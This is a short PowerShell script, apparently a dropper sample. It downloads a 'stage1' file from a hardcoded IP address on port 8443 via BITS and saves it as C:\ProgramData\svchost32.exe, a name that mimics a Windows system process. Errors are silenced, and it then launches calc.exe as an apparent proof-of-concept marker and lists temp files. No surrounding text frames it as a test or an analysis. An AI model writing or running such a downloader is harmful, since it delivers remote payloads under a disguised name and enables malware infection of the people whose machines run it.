
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://203.0.113.143:8443/stage1.ps1',
    [string]$DownloadPath = "C:\ProgramData\svchost32.exe",
    [int]$TransferTimeout = 159
)
try { Start-BitsTransfer -Source $Stage1Url -Destination $DownloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
